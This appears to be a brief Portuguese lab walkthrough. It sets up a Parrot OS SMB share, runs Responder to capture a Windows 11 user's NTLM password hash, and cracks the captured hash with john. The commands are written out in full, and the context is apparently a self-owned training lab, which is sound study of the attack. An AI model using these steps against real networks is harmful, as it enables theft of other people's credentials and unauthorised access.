### Imagens e Configurações de Instâncias

- **win11 c5large 65gb**
- **Parrot OS c5 65gb**

### Parrot OS

```bash
mkdir /home/parrot/sharefolder
```

#### Comando para Partilhar Pasta via SMB

Para partilhar uma pasta no Parrot OS, execute o seguinte comando:

```bash
sudo net usershare add sharefolder /home/parrot/sharefolder "A secret folder shared via SMB" everyone:F guest_ok=y
```
Executar o responder com a interface no "ip a" 
```bash
sudo responder -I ens5
```

#### Acessar Pasta Compartilhada no Windows 11

1. No Windows 11, pressione `Win + R` para abrir o Executar.
2. Digite `\\[IP_privado_do_Parrot]` e pressione Enter.

> **Nota:** Ao tentar colocar a senha, pode ocorrer um erro e aparecerá o hash no Parrot OS.

#### Logs do Responder no Parrot OS

Os logs do Responder são armazenados no seguinte diretório:

```plaintext
/usr/share/responder/logs
```

Para processar os hashes capturados, utilize o `john`:

```bash
john SMB-xxxxxxxx- TAB
```

### Troubleshooting

Se precisar resolver problemas relacionados ao SMB, use os seguintes comandos:

1. Verificar quais processos estão utilizando a porta 445:
    ```bash
    sudo lsof -i :445
    ```

2. Parar o serviço `smbd`:
    ```bash
    sudo systemctl stop smbd
    ```
